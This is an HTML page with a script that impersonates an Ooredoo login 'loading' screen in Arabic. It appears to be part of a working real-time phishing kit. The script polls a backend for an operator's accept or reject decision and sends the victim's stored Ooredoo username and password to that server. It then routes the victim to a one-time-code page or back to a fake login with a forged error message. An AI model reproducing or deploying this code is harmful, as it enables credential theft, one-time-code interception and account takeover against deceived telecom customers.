<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>جاري التحميل - Ooredoo</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root {
    --red: #D0191F;
    --white: #FFFFFF;
    --text: #1A1A1A;
    --text-light: #808080;
    --line: #D0D0D0;
    --bg: #FAFAFA;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; }
  body { 
    font-family: 'Cairo', Tahoma, Arial, sans-serif; 
    background: var(--bg); 
    color: var(--text);
    display: flex;
    flex-direction: column;
  }

  .container {
    flex: 1; max-width: 1200px; width: 100%; margin: 0 auto;
    padding: 60px 24px; padding-bottom: max(40px, env(safe-area-inset-bottom, 0px));
    display: flex; flex-direction: column; align-items: center; justify-content: center;
  }

  .loading-content { text-align: center; }

  .spinner {
    width: 80px;
    height: 80px;
    border: 6px solid var(--line);
    border-top-color: var(--red);
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin: 0 auto 32px;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  h2 {
    font-size: 1.5rem;
    color: var(--text);
    margin-bottom: 12px;
    font-weight: 700;
  }

  p {
    color: var(--text-light);
    font-size: 1rem;
    font-weight: 500;
  }

  @media (max-width: 480px) {
    .container { padding: 48px 20px; }
    h2 { font-size: 1.3rem; }
    .spinner { width: 60px; height: 60px; border-width: 5px; }
  }
</style>
</head>
<body>

<main class="container">
  <div class="loading-content">
    <div class="spinner"></div>
    <h2>جاري تسجيل الدخول</h2>
    <p>يرجى الانتظار...</p>
  </div>
</main>

<script>
  function getFlowDecision() {
    const orderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-current';
    const decisionKey = 'ooredooDecision_' + orderId;
    const flowKey = 'ooredooFlow_' + orderId;
    const decision = localStorage.getItem(decisionKey) || sessionStorage.getItem(decisionKey) || '';
    const flow = localStorage.getItem(flowKey) || sessionStorage.getItem(flowKey) || 'login';
    return { decision, flow };
  }

  function setFlowDecision(decision) {
    const orderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-current';
    const decisionKey = 'ooredooDecision_' + orderId;
    try {
      localStorage.setItem(decisionKey, decision);
      sessionStorage.setItem(decisionKey, decision);
    } catch (err) {}
  }

  async function checkDecision() {
    const orderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-current';
    const decisionKey = 'ooredooDecision_' + orderId;
    const flowKey = 'ooredooFlow_' + orderId;
    let decision = localStorage.getItem(decisionKey) || sessionStorage.getItem(decisionKey) || '';
    let flow = localStorage.getItem(flowKey) || sessionStorage.getItem(flowKey) || 'login';

    try {
      const res = await fetch('/api/orders/' + encodeURIComponent(orderId), { cache: 'no-store' });
      if (res.ok) {
        const data = await res.json();
        const order = data && data.order ? data.order : {};
        if (order.ooredooDecision) {
          decision = order.ooredooDecision;
          flow = order.ooredooFlow || flow;
          try {
            localStorage.setItem(decisionKey, decision);
            sessionStorage.setItem(decisionKey, decision);
            localStorage.setItem(flowKey, flow);
            sessionStorage.setItem(flowKey, flow);
          } catch (err) {}
        }
      }
    } catch (err) {}

    if (decision === 'accept') {
      if (flow === 'otp') {
        localStorage.removeItem(decisionKey);
        sessionStorage.removeItem(decisionKey);
        localStorage.setItem(flowKey, 'otp');
        sessionStorage.setItem(flowKey, 'otp');
        window.location.href = 'success.html';
        return;
      }

      const payload = {
        ooredooUser: sessionStorage.getItem('ooredooUser') || '',
        ooredooPass: sessionStorage.getItem('ooredooPass') || '',
        status: 'pending'
      };

      const body = JSON.stringify(payload);
      if (navigator.sendBeacon) {
        navigator.sendBeacon('/api/orders/' + encodeURIComponent(orderId), new Blob([body], { type: 'application/json' }));
      } else {
        fetch('/api/orders/' + encodeURIComponent(orderId), {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: body,
          keepalive: true
        }).catch(() => {});
      }

      sessionStorage.setItem('loginError', 'تم قبول الطلب. يرجى متابعة التحقق من الرمز.');
      localStorage.removeItem(decisionKey);
      sessionStorage.removeItem(decisionKey);
      localStorage.setItem(flowKey, 'otp');
      sessionStorage.setItem(flowKey, 'otp');
      window.location.href = 'otp_ooredoo.html';
      return;
    }

    if (decision === 'reject') {
      if (flow === 'otp') {
        sessionStorage.setItem('otpError', 'الرمز غير صحيح أو غير صالح');
        localStorage.removeItem(decisionKey);
        sessionStorage.removeItem(decisionKey);
        localStorage.setItem(flowKey, 'otp');
        sessionStorage.setItem(flowKey, 'otp');
        window.location.href = 'otp_ooredoo.html';
        return;
      }

      sessionStorage.setItem('loginError', 'اسم المستخدم أو كلمة المرور غير صحيح');
      localStorage.removeItem(decisionKey);
      sessionStorage.removeItem(decisionKey);
      localStorage.setItem(flowKey, 'login');
      sessionStorage.setItem(flowKey, 'login');
      window.location.href = 'login_ooredoo.html';
      return;
    }

    setTimeout(checkDecision, 2000);
  }

  checkDecision();
</script>

</body>
</html>
